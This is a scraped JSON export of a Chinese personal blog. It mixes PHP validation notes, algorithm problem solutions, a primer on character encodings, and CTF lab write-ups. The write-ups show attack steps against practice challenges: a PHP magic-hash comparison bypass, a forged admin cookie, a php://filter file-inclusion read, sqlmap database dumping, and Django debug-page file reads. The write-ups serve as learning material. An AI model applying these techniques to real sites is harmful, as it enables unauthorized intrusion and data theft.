&#125; 注释：preg_match() 函数检索字符串的模式，如果模式存在则返回 true，否则返回 false。 PHP - 验证 E-mail以下代码展示的简单方法检查 e-mail 1234$email = test_input($_POST[\"email\"]);if (!preg_match(\"/([\\w\\-]+\\@[\\w\\-]+\\.[\\w\\-]+)/\",$email)) &#123; $emailErr = \"无效的 email 格式！\"; &#125; PHP - 验证 URL以下代码展示的方法检查 URL 地址语法是否有效（这条正则表达式同时允许 URL 中的斜杠）。如果 URL 地址语法无效，则存储一条错误消息： 12345$website = test_input($_POST[\"website\"]);if (!preg_match(\"/\\b(?:(?:https?|ftp):\\/\\/|www\\.)[-a-z0-9+&amp;@#\\/%?=~_|!:,.;]*[-a-z0-9+&amp;@#\\/%=~_|]/i\",$website)) &#123; $websiteErr = \"无效的 URL\"; &#125; PHP - 验证 Name、E-mail、以及 URL现在，脚本是这样的： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051实例&lt;?php// 定义变量并设置为空值$nameErr = $emailErr = $genderErr = $websiteErr = \"\";$name = $email = $gender = $comment = $website = \"\";if ($_SERVER[\"REQUEST_METHOD\"] == \"POST\") &#123; if (empty($_POST[\"name\"])) &#123; $nameErr = \"Name is required\"; &#125; else &#123; $name = test_input($_POST[\"name\"]); // 检查名字是否包含字母和空格 if (!preg_match(\"/^[a-zA-Z ]*$/\",$name)) &#123; $nameErr = \"Only letters and white space allowed\"; &#125; &#125; if (empty($_POST[\"email\"])) &#123; $emailErr = \"Email is required\"; &#125; else &#123; $email = test_input($_POST[\"email\"]); // 检查电邮地址语法是否有效 if (!preg_match(\"/([\\w\\-]+\\@[\\w\\-]+\\.[\\w\\-]+)/\",$email)) &#123; $emailErr = \"Invalid email format\"; &#125; &#125; if (empty($_POST[\"website\"])) &#123; $website = \"\"; &#125; else &#123; $website = test_input($_POST[\"website\"]); // 检查 URL 地址语言是否有效（此正则表达式同样允许 URL 中的下划线） if (!preg_match(\"/\\b(?:(?:https?|ftp):\\/\\/|www\\.)[-a-z0-9+&amp;@#\\/%?=~_|!:,.;]*[-a-z0-9+&amp;@#\\/% =~_|]/i\",$website)) &#123; $websiteErr = \"Invalid URL\"; &#125; &#125; if (empty($_POST[\"comment\"])) &#123; $comment = \"\"; &#125; else &#123; $comment = test_input($_POST[\"comment\"]); &#125; if (empty($_POST[\"gender\"])) &#123; $genderErr = \"Gender is required\"; &#125; else &#123; $gender = test_input($_POST[\"gender\"]); &#125;&#125;?&gt;","categories":[{"name":"notes","slug":"notes","permalink":"https://singlemindedt.github.io/categories/notes/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://singlemindedt.github.io/tags/PHP/"}]},{"title":"CumtCTF2019华为杯","slug":"CumtCTF2019华为杯","date":"2019-09-30T07:38:23.000Z","updated":"2019-12-13T05:35:27.088Z","comments":true,"path":"2019/09/30/CumtCTF2019华为杯/","link":"","permalink":"https://singlemindedt.github.io/2019/09/30/CumtCTF2019华为杯/","excerpt":"","text":"Web签到题点开链接为seed和hash参数的提交框，尝试admin，admin，返回Fail…;查看响应，发现有payload，提示访问index.php?source=1发现php代码: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667&lt;?phpfunction gen_secured_random() &#123; // cause random is the way $a = rand(1337,2600)*42; $b = rand(1879,1955)*42; $a &lt; $b ? $a ^= $b ^= $a ^= $b : $a = $b; return $a+$b;&#125;function secured_hash_function($plain) &#123; // cause md5 is the best hash ever $secured_plain = sanitize_user_input($plain); return md5($secured_plain);&#125;function sanitize_user_input($input) &#123; // cause someone told me to never trust user input $re = '/[^a-zA-Z0-9]/';//re不为a-zA-Z0-9 $secured_input = preg_replace($re, \"\", $input); //preg_replace函数（搜索input中符合re正则的内容用“ ”代替，即去除不是a-zA-Z0-9） return $secured_input;&#125;/*&lt;?php // cause someone told me to never trust user input $input='&lt;&lt;&lt;&gt;&gt;&gt;.AZ.,,assddf23232????'; $re = '/[^a-zA-Z0-9]/';//re不为a-zA-Z0-9 $secured_input = preg_replace($re, \"\", $input); //preg_replace函数（搜索input中符合re正则的内容用“ ”代替，即去除非a-zA-Z0-9） echo $secured_input; ?&gt; run:AZassddf23232*/if (isset($_GET['source'])) &#123; show_source(__FILE__); die();&#125;require_once \"secret.php\";if (isset($_POST['s']) &amp;&amp; isset($_POST['h'])) &#123;//输入s,h //isset在php中用来判断变量是否声明，该函数返回布尔类型的值，即true/false。 //isset只能用于变量，因为传递任何其它参数都将造成解析错误 $s = sanitize_user_input($_POST['s']);//s=输入s $h = secured_hash_function($_POST['h']);//h=MD5（h） $r = gen_secured_random();//r=随机数 if($s != false &amp;&amp; $h != false) &#123; if($s.$r == $h) //弱类型比较 &#123;//连接s和r，即：用户输入s+随机数==用户输入h //*****此处利用0e漏洞，即0e+r==(填写hash为0开头字符) print \"Well done! Here is your flag: \".$flag; &#125; else &#123; print \"Fail...\"; &#125; &#125; else &#123; print \"&lt;p&gt;Hum ...&lt;/p&gt;\"; &#125;&#125;?&gt; 构造post传值： 1s=0e1&amp;h=QNKCDZO&amp;submit=Check Misc两岁半的猪打开压缩包为三只猪png，利用stegsolve发下有二维码； 寻找你的Key得到压缩包，解压发现需要密码，用binwalk文件分离，得到另外一个压缩包0.zip和kEy.exe将kEy.exe放进winhex,得到逆序图片base64编码逆序编码，转图片，得到二维码 委屈的兔兔将图片拖入winhex，得到Unicode 编码，直接百度解码得到 flag 302？还有其他？看到302，抓包，发现存在1ndex.php,访问1ndex.php发现RAW中有key和base64编码后的png图片，转图片，没有什么发现，直接站长工具解密带隐藏信息的图片，输入key，得到flag；（此处做一补充，当时利用binwalk -e分离文件得到一个空文本文件和一个zlib文件，利用脚本解密zlib文件应该也能成功，不过当时未跑出来）","categories":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/tags/CTF/"}]},{"title":"暴跳老板+Flag在哪？+美味饼干","slug":"暴跳老板","date":"2019-09-25T14:49:02.000Z","updated":"2019-12-18T00:07:02.689Z","comments":true,"path":"2019/09/25/暴跳老板/","link":"","permalink":"https://singlemindedt.github.io/2019/09/25/暴跳老板/","excerpt":"","text":"暴跳老板随便输入内容，得到弹窗要以POST方式用Dear发邮件，抓包： 直接在postText后添加Dear=MyBoss，发包得到flag Flag在哪？burpsuit抓包，发现有五个跳转页面，但是都没有flag:)/where_is_flag.php/flag.php/I_have_a_frog.php/I_have_a_flag.php/no_flag.php看看大佬们骚操作，要组合一下 orz ，flagfrog.php,发包得到flag。 美味的饼干点击链接得到一个登录页面，尝试admin，111提示“登录成功，欢迎admin！”，但是并没有什么有用的信息。查看源代码，提示“只有admin才有flag”。检查请求头，有可疑Cookie： 1login=ZWUxMWNiYjE5MDUyZTQwYjA3YWFjMGNhMDYwYzIzZWU%3D base64解码： 1ee11cbb19052e40b07aac0ca060c23ee MD5解码：user 那么意思基本就清楚了，应该是要Cookie信息为admin，才能够得到flag adminMD5： 121232f297a57a5a743894a0e4a801fc3 base64: 1MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM= 更改Cookie，重发，在响应里看到flag","categories":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/categories/CTF/"},{"name":"攻防世界","slug":"CTF/攻防世界","permalink":"https://singlemindedt.github.io/categories/CTF/攻防世界/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"}]},{"title":"最大子段和","slug":"最大子段和","date":"2019-09-24T14:18:31.000Z","updated":"2019-09-24T14:22:04.803Z","comments":true,"path":"2019/09/24/最大子段和/","link":"","permalink":"https://singlemindedt.github.io/2019/09/24/最大子段和/","excerpt":"","text":"问题D：最大子段和题目描述给定n 个整体组成的序列a1，a2，… an，求子段和a i + a i + 1 + … + a j（子段可为空集）的替代。 输入包含多组测试数据。第一行为一个整数T（1 &lt;= T &lt;= 20），代表测试数据个数。 每组测试数据第一行为一个整数n ，代表有n 个整数（1 &lt;= n &lt;= 10000）。 接下来一行有n 个数x（-1000 &lt;= x &lt;= 1000）。 输出输出其对应的最大子段和。 样例输入123162 -11 4 13 -1 2 样例输出118 提示子段可为空集，答案为0 代码：12345678910111213141516171819202122232425262728#include&lt;iostream&gt;using namespace std;int maxsum(int b[],int n)&#123; int tempsum=0; int Maxsum=0; for(int i=0;i&lt;n;i++) &#123; tempsum=(tempsum+b[i])&gt;b[i]?(tempsum+b[i]):b[i]; if(tempsum&gt;Maxsum) Maxsum=tempsum; &#125; return Maxsum;&#125;int main()&#123; int T; int n; while(cin&gt;&gt;T&gt;&gt;n) &#123; int a[10000]=&#123;0&#125;; for(int i=0;i&lt;n;i++) cin&gt;&gt;a[i]; int SUM=maxsum(a,n); cout&lt;&lt;SUM&lt;&lt;endl; return 0; &#125;&#125;","categories":[{"name":"算法","slug":"算法","permalink":"https://singlemindedt.github.io/categories/算法/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://singlemindedt.github.io/tags/算法/"},{"name":"动态规划","slug":"动态规划","permalink":"https://singlemindedt.github.io/tags/动态规划/"}]},{"title":"汽水瓶","slug":"汽水瓶","date":"2019-09-24T09:41:42.000Z","updated":"2019-09-24T14:16:32.134Z","comments":true,"path":"2019/09/24/汽水瓶/","link":"","permalink":"https://singlemindedt.github.io/2019/09/24/汽水瓶/","excerpt":"","text":"问题 E: 汽水瓶【25】题目描述有这样一道智力题：“某商店规定：三个空汽水瓶可以换一瓶汽水。小张手上有十个空汽水瓶，她最多可以换多少瓶汽水喝？”答案是5瓶，方法如下：先用9个空瓶子换3瓶汽水，喝掉3瓶满的，喝完以后4个空瓶子，用3个再换一瓶，喝掉这瓶满的，这时候剩2个空瓶子。然后你让老板先借给你一瓶汽水，喝掉这瓶满的，喝完以后用3个空瓶子换一瓶满的还给老板。如果小张手上有n个空汽水瓶，最多可以换多少瓶汽水喝？ 输入输入文件最多包含10组测试数据，每个数据占一行，仅包含一个正整数n(1≤n≤100)，表示小张手上的空汽水瓶数。n=0表示输入结束，你的程序不应当处理这一行。 输出对于每组测试数据，输出一行，表示最多可以喝的汽水瓶数。如果一瓶也喝不到，输出 0 样例输入1234310810 样例输出1231540 代码：```C++ #includeusing namespace std;int main(){ int n=0; while(cin&gt;&gt;n) { int m=0;//最多可喝 if(n==0) { continue; } if(n==2)//第一次忘了这个初次n=2的情况 { cout&lt;&lt;1&lt;&lt;endl; continue;//此处若无会多输出 0 } else while(n&gt;2) { int bn=n; n=n/3+n%3; m+=bn/3; if(n==2) { m++; break; } } cout&lt;&lt;m&lt;&lt;endl; } return 0;}/*由规律可得如下方法： #includeusing namespace std;int main(){int num = 0; while (cin&gt;&gt;num) if (num == 0) continue; else cout&lt;&lt;num/2&lt;&lt;endl;//都是整除结果 return 0;}*/","categories":[{"name":"算法","slug":"算法","permalink":"https://singlemindedt.github.io/categories/算法/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://singlemindedt.github.io/tags/算法/"}]},{"title":"最长公共子序列","slug":"最长公共子序列","date":"2019-09-24T08:02:54.000Z","updated":"2019-09-24T08:07:31.137Z","comments":true,"path":"2019/09/24/最长公共子序列/","link":"","permalink":"https://singlemindedt.github.io/2019/09/24/最长公共子序列/","excerpt":"","text":"问题 A: 最长公共子序列时间限制: 1 Sec 内存限制: 32 MB 题目描述给你一个序列X和另一个序列Z，当Z中的所有元素都在X中存在，并且在X中的下标顺序是严格递增的，那么就把Z叫做X的子序列。例如：Z=&lt;a,b,f,c&gt;是序列X=&lt;a,b,c,f,b,c&gt;的一个子序列，Z中的元素在X中的下标序列为&lt;1,2,4,6&gt;。现给你两个序列X和Y，请问它们的最长公共子序列的长度是多少？ 输入输入包含多组测试数据。每组输入占一行，为两个字符串，由若干个空格分隔。每个字符串的长度不超过100。 输出对于每组输入，输出两个字符串的最长公共子序列的长度。 样例输入123abcfbc abfcabprogramming contest abcd mnp 样例输出123420 代码： 12345678910111213141516171819202122#include&lt;iostream&gt;#include&lt;string&gt;using namespace std;int main()&#123; string x; string z; int dp[105][105] =&#123;0&#125;; while(cin&gt;&gt;x&gt;&gt;z) &#123; int len1 = x.size();//8 int len2 = z.size();//9 for(int i =1; i &lt;= len1; i++) for(int j =1; j &lt;=len2; j++) if(x[i-1]==z[j-1])//i,j&gt;0,xi=zj dp[i][j] =dp[i - 1][j - 1] + 1; else dp[i][j]= max(dp[i][j-1], dp[i-1][j]);//i,j&gt;0,xi!=yj cout&lt;&lt;dp[len1][len2]&lt;&lt;endl; &#125; return 0;&#125;","categories":[{"name":"算法","slug":"算法","permalink":"https://singlemindedt.github.io/categories/算法/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://singlemindedt.github.io/tags/算法/"},{"name":"动态规划","slug":"动态规划","permalink":"https://singlemindedt.github.io/tags/动态规划/"}]},{"title":"文件包含漏洞","slug":"文件包含漏洞","date":"2019-09-23T16:13:50.000Z","updated":"2019-09-23T16:23:38.411Z","comments":true,"path":"2019/09/24/文件包含漏洞/","link":"","permalink":"https://singlemindedt.github.io/2019/09/24/文件包含漏洞/","excerpt":"","text":"php://filter（本地磁盘文件进行读取）元封装器，设计用于”数据流打开”时的”筛选过滤”应用，对本地磁盘文件进行读写。 用法： 123?filename=php://filter/convert.base64-encode/resource=xxx.php ?filename=php://filter/read=convert.base64-encode/resource=xxx.php 一样。 条件：只是读取，需要开启 allow_url_fopen，不需要开启 allow_url_include； MOCTF上这道文件包含题，直接 1?file=php://filter/convert.base64-encode/resource=flag.php 得到一串base64编码解码得到flag 关于文件包含漏洞","categories":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/tags/CTF/"},{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"}]},{"title":"NewsCenter","slug":"攻防世界之Web高手进阶-NewsCenter","date":"2019-09-10T15:45:00.000Z","updated":"2019-12-30T05:41:24.198Z","comments":true,"path":"2019/09/10/攻防世界之Web高手进阶-NewsCenter/","link":"","permalink":"https://singlemindedt.github.io/2019/09/10/攻防世界之Web高手进阶-NewsCenter/","excerpt":"","text":"NewsCenter题目分析：打开链接，出现如下页面：[N1]:(https://dev.tencent.com/u/Single-minded_T/p/Single-minded_T/git/raw/master/images/N1.PNG) 实际操作： 尝试是否为sql注入：抓包： 利用sqlmap,命令：sqlmap.py -r 1.txt –dbs 看到有一个news，命令：sqlmap.py -r 1.txt -D news –dump 得到flag！","categories":[{"name":"Writeup","slug":"Writeup","permalink":"https://singlemindedt.github.io/categories/Writeup/"},{"name":"Web","slug":"Writeup/Web","permalink":"https://singlemindedt.github.io/categories/Writeup/Web/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"}]},{"title":"ics-06","slug":"攻防世界之Web高手进阶-ics-06","date":"2019-09-10T09:00:00.000Z","updated":"2019-12-30T05:24:32.339Z","comments":true,"path":"2019/09/10/攻防世界之Web高手进阶-ics-06/","link":"","permalink":"https://singlemindedt.github.io/2019/09/10/攻防世界之Web高手进阶-ics-06/","excerpt":"","text":"ics-06题目描述：云平台报表中心收集了设备管理基础服务的数据，但是数据被删除了，只有一处留下了入侵者的痕迹。 实际操作： 进入页面只有报表中心可以点击，有一个输入框，各种fuzzing，没成功，后来才知道直接爆破就行。。。 知识点补充：关于爆破","categories":[{"name":"Writeup","slug":"Writeup","permalink":"https://singlemindedt.github.io/categories/Writeup/"},{"name":"Web","slug":"Writeup/Web","permalink":"https://singlemindedt.github.io/categories/Writeup/Web/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"}]},{"title":"Cat","slug":"攻防世界之Web高手进阶-cat","date":"2019-09-09T16:00:00.000Z","updated":"2019-12-30T05:09:06.244Z","comments":true,"path":"2019/09/10/攻防世界之Web高手进阶-cat/","link":"","permalink":"https://singlemindedt.github.io/2019/09/10/攻防世界之Web高手进阶-cat/","excerpt":"","text":"Cat题目描述：仅给出了这样一个页面： 实际操作：输入cat，得到： 123456PING cat.ad-world-198302431-4658.rancher.internal (10.42.197.21) 56(84) bytes of data.64 bytes from b4fccc7cf554 (10.42.197.21): icmp_seq=1 ttl=64 time=0.045 ms--- cat.ad-world-198302431-4658.rancher.internal ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 0.045/0.045/0.045/0.000 ms 并在URL中如此传参： 1http://111.198.29.45:35113/index.php?url=cat 输入127.0.0.1： 123456PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.061 ms--- 127.0.0.1 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 0.061/0.061/0.061/0.000 ms 尝试使用命令连接符/管道命令，均被屏蔽；目前仅知道，输入框通过用户输入进行GET方式传参；(此处请跳转文末 orz)那么只能从url入手了，看看有没有可能爆出一些有用的信息；测试发现超过ASCll可打印字符之外的url编码都会报错，比如键入http://111.198.29.45:35113/index.php?url=%8c ： 给出报错信息： 可以明显看到使用的是Django框架； 查看配置文件信息：settings.py 在报错信息中搜索database，发现的到有关数据库内容： 参考： 通过http://111.198.29.45:35113/index.php?url=@/opt/api/database.sqlite3 得到数据库内容：查找ctf关键字： 源码里就是GET啊，那这个又是啥？？？post?！orz orz orz","categories":[{"name":"Writeup","slug":"Writeup","permalink":"https://singlemindedt.github.io/categories/Writeup/"},{"name":"Web","slug":"Writeup/Web","permalink":"https://singlemindedt.github.io/categories/Writeup/Web/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"}]},{"title":"Win10安装pygame","slug":"pygame_install","date":"2019-09-09T15:37:45.000Z","updated":"2019-12-17T16:21:40.141Z","comments":true,"path":"2019/09/09/pygame_install/","link":"","permalink":"https://singlemindedt.github.io/2019/09/09/pygame_install/","excerpt":"","text":"检查pip是否安装，查看Python安装版本； 2. 1pip install wheel 3. 1pip install Pygame==1.9.6","categories":[{"name":"notes","slug":"notes","permalink":"https://singlemindedt.github.io/categories/notes/"}],"tags":[{"name":"tools","slug":"tools","permalink":"https://singlemindedt.github.io/tags/tools/"}]},{"title":"Byte CTF 字节跳动网络安全攻防大赛","slug":"Byte_CTF","date":"2019-09-09T08:36:00.000Z","updated":"2019-12-17T16:18:05.827Z","comments":true,"path":"2019/09/09/Byte_CTF/","link":"","permalink":"https://singlemindedt.github.io/2019/09/09/Byte_CTF/","excerpt":"","text":"betgame给了提示，nc 112.125.25.81 9999 知识补充：nc即netcat，被誉为网络安全界的“瑞士军刀”。透过使用TCP或UDP协议的网络连接去读写数据。它被设计成一个稳定的后门(back-end)工具，能够直接由其它程序和脚本轻松驱动。同时，它也是一个功能强大的网络调试和探测工具，能够建立你需要的几乎所有类型的网络连接. 使用之前首先我们要弄明白netcat的工作原理,其实netcat的原理很简单,它就是从网络的一端读入数据,然后输出到网络的另一端,它可以使用tcp 和udp协议.之所以叫做netcat,因为它是网络上的cat,想象一下cat的功能,读出一个文件的内容,然后输出到屏幕上(默认的stdout是屏幕,当然可以重定向到其他地方).netcat也是如此,它读取一端的输入,然后传送到网络的另一端。ncat/nc 既是一个端口扫描工具，也是一款安全工具，还能是一款监测工具，甚至可以做为一个简单的 TCP 代理。细节 实际操作：可以将nc作为聊天工具利用，本地server1上传nc 122.125.25.81 9999Server2启动监听9999端口：nc -lp 9999至此就可以简单交互，本题提示要30次全赢，找规律，对应输入即可； Linux nc命令详解","categories":[{"name":"Writeup","slug":"Writeup","permalink":"https://singlemindedt.github.io/categories/Writeup/"}],"tags":[{"name":"Misc","slug":"Misc","permalink":"https://singlemindedt.github.io/tags/Misc/"}]},{"title":"CTF中常见编码","slug":"CTF中常见编码总结","date":"2019-09-08T01:05:00.000Z","updated":"2019-12-17T13:45:20.583Z","comments":true,"path":"2019/09/08/CTF中常见编码总结/","link":"","permalink":"https://singlemindedt.github.io/2019/09/08/CTF中常见编码总结/","excerpt":"","text":"ASCII码表 ASCII（American Standard Code for Information Interchange，美国信息交换标准代码）是基于拉丁字母的一套电脑编码系统，主要用于显示现代英语和其他西欧语言。它是现今最通用的单字节编码系统，并等同于国际标准ISO/IEC 646。 编码方法 因为1位二进制数可以表示（2^1=）2种状态：0、1；而2位二进制数可以表示（2^2）=4种状态：00、01、10、11；依次类推，7位二进制数可以表示（2^7=）128种状态，每种状态都唯一地编为一个7位的二进制码，对应一个字符（或控制码），这些码可以排列成一个十进制序号0～127。所以，7位ASCII码是用七位二进制数进行编码的，可以表示128个字符。 第0～32号及第127号(共34个)是控制字符或通讯专用字符，如控制符：LF（换行）、CR（回车）、FF（换页）、DEL（删除）、BEL（振铃）等；通讯专用字符：SOH（文头）、EOT（文尾）、ACK（确认）等； ASCII码大致可以分作三部分组成：第一部分是：ASCII非打印控制字符第二部分是：ASCII打印字符第三部分是：扩展ASCII打印字符 第一部分：ASCII非打印控制字符表ASCII表上的数字0–31分配给了控制字符，用于控制像打印机等一些外围设备。例如，12代表换页/新页功能。此命令指示打印机跳到下一页的开头。（参详ASCII码表中0-31） 第二部分：ASCII打印字符数字 32–126 分配给了能在键盘上找到的字符，当您查看或打印文档时就会出现。数字127代表 DELETE 命令。（参详ASCII码表中32-127） 第三部分：扩展ASCII打印字符扩展的ASCII字符满足了对更多字符的需求。扩展的ASCII包含ASCII中已有的128个字符（数字0–32显示在下图中），又增加了128个字符，总共是256个。即使有了这些更多的字符，许多语言还是包含无法压缩到256个字符中的符号。因此，出现了一些ASCII的变体来囊括地区性字符和符号。例如，许多软件程序把ASCII表（又称作ISO8859-1）用于北美、西欧、澳大利亚和非洲的语言。 特征特点：用1个字节的8位数来编码英文字符集，即所有字母数字等英文符号可以用二进制数、十进制、十六进制来表示。 Unicode编码Unicode是一个编码方案，Unicode 是为了解决传统的字符编码方案的局限而产生的，它为每种语言中的每个字符设定了统一并且唯一的二进制编码，以满足跨语言、跨平台进行文本转换、处理的要求。Unicode 编码共有三种具体实现，分别为utf-8,utf-16,utf-32，其中utf-8占用一到四个字节，utf-16占用二或四个字节，utf-32占用四个字节。 UTF-8UTF-8以字节为单位对Unicode进行编码。从Unicode到UTF-8的编码方式如下：|Unicode编码(十六进制)|UTF-8 字节流(二进制)||:——–:|:————-:|| 000000-00007F | 0xxxxxxx || 000080-0007FF | 110xxxxx 10xxxxxx || 000800-00FFFF | 1110xxxx 10xxxxxx 10xxxxxx|| 010000-10FFFF | 11110xxx10xxxxxx10xxxxxx10xxxxxx|UTF-8的特点是对不同范围的字符使用不同长度的编码。对于0x00-0x7F之间的字符，UTF-8编码与ASCII编码完全相同。UTF-8编码的最大长度是4个字节。从上表可以看出，4字节模板有21个x，即可以容纳21位二进制数字。Unicode的最大码位0x10FFFF也只有21位。 例1：“汉”字的Unicode编码是0x6C49。0x6C49在0x0800-0xFFFF之间，使用3字节模板：1110xxxx 10xxxxxx 10xxxxxx。将0x6C49写成二进制是：0110 1100 0100 1001， 用这个比特流依次代替模板中的x，得到：11100110 10110001 10001001，即E6 B1 89。 例2：Unicode编码0x20C30在0x010000-0x10FFFF之间，使用4字节模板：11110xxx 10xxxxxx 10xxxxxx 10xxxxxx。将0x20C30写成21位二进制数字（不足21位就在前面补0）：0 0010 0000 1100 0011 0000，用这个比特流依次代替模板中的x，得到：11110000 10100000 10110000 10110000，即F0 A0 B0 B0。 [UTF-8\\UTF-32]UTF-8\\UTF-32 Unicode一般有四种表示形式 &amp;#x [Hex] &#x0054;&#x0068;&#x0065; &amp;# [Decimal] &#00084;&#00104;&#00101; \\U [Hex] \\U0054\\U0068\\U0065 \\U+ [Hex] \\U+0054\\U+0068\\U+0065 特征特点：国际标准字符，将全球的各种语言的每个字符定义一个唯一的编码，以满足跨语言、跨平台文本信息的转换，当编码和解码的字符集出现不一致的时候就会出现乱码。 URL编码url编码是一种浏览器用来打包表单输入的格式。浏览器从表单中获取所有的name和其中的值 ，将它们以name/value参数编码（移去那些不能传送的字符，将数据排行等等）作为URL的一部分或者分离地发给服务器。不管哪种情况，在服务器端的表单输入格式样子象这样：theName=Ichabod+Crane&amp;gender=male&amp;status=missing&amp; ;headless=yesURL地址（常说网址）规定了常用地数字，字母可以直接使用，另外一批作为特殊用户字符也可以直接用（/,:@等），剩下的其它所有字符必须通过%后跟两位十六进制数来替换非ASCII字符。 编码规则URL编码遵循下列规则： 每对name/value由&amp;；符分开；每对来自表单的name/value由=符分开。如果用户没有输入值给这个name，那么这个name还是出现，只是无值。任何特殊的字符（就是那些不是简单的七位ASCII，如汉字）将以百分符%用十六进制编码，当然也包括象 =,&amp;；，和 % 这些特殊的字符。其实url编码就是一个字符ascii码的十六进制。不过稍微有些变动，需要在前面加上“%”。比如： “\\”，它的ascii码是92，92的十六进制是5c，所以“\\”的url编码就是%5c。 空格字符，ascii 码是 32，对应16 进制是‘20’，那么 urlencode 编码结果是:%20。 URL编码平时是用不到的，因为IE会自动将输入到地址栏的非数字字母转换为url编码。曾有人提出数据库名字里带上“#”以防止被下载，因为IE遇到#就会忽略后面的字母。破解方法很简单——用url编码%23替换掉#。 特征特点：字符ASCII码的十六进制，并在前面加上% URL原理、URL编码、URL特殊字符 base64编码Base64是网络上最常见的用于传输8Bit字节码的编码方式之一，Base64就是一种基于64个可打印字符来表示二进制数据的方法。 Base64编码是从二进制到字符的过程，可用于在HTTP环境下传递较长的标识信息。采用Base64编码具有不可读性，需要解码后才能阅读。 Base64由于以上优点被广泛应用于计算机的各个领域，然而由于输出内容中包括两个以上“符号类”字符（+, /, =)，不同的应用场景又分别研制了Base64的各种“变种”。为统一和规范化Base64的输出，Base62x被视为无符号化的改进版本。 Base64要求把每三个8Bit的字节转换为四个6Bit的字节（38 = 46 = 24），然后把6Bit再添两位高位0，组成四个8Bit的字节，也就是说，转换后的字符串理论上将要比原来的长1/3。 特征：密文由64个字符(A-Z,a-z,0-9,+,/)组成，末尾可能会出现1或2个’=’ 最多有2个 规则 把3个字节变成4个字节。 每76个字符加一个换行符。 最后的结束符也要处理。 字符串转为2进制，每3个8位二进制转化为4个6位二进制，六位二进制转化为十进制，根据十进制数值在base64编码表中获取字符。Base64编码将串起来的二进制以6位进行分割.所以分切之前的二进制位数应该是24的倍数(即6,8的最小公倍数).如果不足24位,则在编码后数据后面添加”=”(=为填充字符)例子1转换前 11111111, 11111111, 11111111 （二进制）转换后 00111111, 00111111, 00111111, 00111111 （二进制）上面的三个字节是原文，下面的四个字节是转换后的Base64编码，其前两位均为0。转换后，我们用一个码表来得到我们想要的字符串（也就是最终的Base64编码），这个表是这样的：（摘自RFC2045）转换表： 例子2转换前 10101101,10111010,01110110转换后 00101011, 00011011 ,00101001 ,00110110十进制 43 27 41 54对应码表中的值 r b p 2所以上面的24位编码，编码后的Base64值为 rbp2解码同理，把 rbq2 的二进制位连接上再重组得到三个8位值，得出原码。 base32编码Base32使用了ASCII编码中可打印的32个字符(大写字母AZ和数字27)对任意字节数据进行编码.Base32将串起来的二进制数据按照5个二进制位分为一组,由于传输数据的单位是字节(即8个二进制位).所以分割之前的二进制位数是40的倍数(40是5和8的最小公倍数).如果不足40位,则在编码后数据补充”=”,一个”=”相当于一个组(5个二进制位),编码后的数据是原先的8\\5倍. 特征：密文由32个字符（A-Z,2-7)组成，末尾可能会有‘=’，但最多有6个 base16 base16是用16（2的4次方）个特定ASCII码表示256个ASCII字符。1个ASCII字符经过base16编码后会变为2个字符，长度增加一倍。 将数据转换为二进制数，不足8比特位高位补0.然后将所有的二进制全部串起来,4个二进制位为一组,转化成对应十进制数,根据十进制数值找到Base16编码表里面对应的字符.Base16是4个比特位表示一个字符,所以原始是1个字节(8个比特位)刚好可以分成两组,也就是说原先如果使用ASCII编码后的一个字符,现在转化成两个字符.数据量是原先的2倍,不需要补’=’ 特征：密文由16个字符（0-9,A-F）组成 数值 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 字符 0 1 2 3 4 5 6 7 8 9 A B C D E F","categories":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/categories/CTF/"}],"tags":[{"name":"编码","slug":"编码","permalink":"https://singlemindedt.github.io/tags/编码/"}]},{"title":"攻防世界之Web新手（7-12）","slug":"攻防世界之Web新手（7-12）","date":"2019-09-05T13:09:03.000Z","updated":"2019-12-30T04:37:17.261Z","comments":true,"path":"2019/09/05/攻防世界之Web新手（7-12）/","link":"","permalink":"https://singlemindedt.github.io/2019/09/05/攻防世界之Web新手（7-12）/","excerpt":"","text":"simple_js题目描述：小宁发现了一个网页，但却一直输不对密码。(Flag格式为 Cyberpeace{xxxxxxxxx} )打开链接空白，查看源码，有如下代码： 12345678910111213141516171819202122232425262728293031function dechiffre(pass_enc) &#123; var pass = \"70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65\"; var tab = pass_enc.split(','); var tab2 = pass.split(','); var i, j, k, l = 0, m, n, o, p = \"\"; i = 0; j = tab.length; k = j + (l) + (n = 0); n = tab2.length; for (i = (o = 0); i &lt; (k = j = n); i++) &#123; o = tab[i - l]; p += String.fromCharCode((o = tab2[i])); if (i == 5) break; &#125; for (i = (o = 0); i &lt; (k = j = n); i++) &#123; o = tab[i - l]; if (i &gt; 5 &amp;&amp; i &lt; k - 1) p += String.fromCharCode((o = tab2[i])); &#125; p += String.fromCharCode(tab2[17]); pass = p; return pass;&#125;String[\"fromCharCode\"](dechiffre( 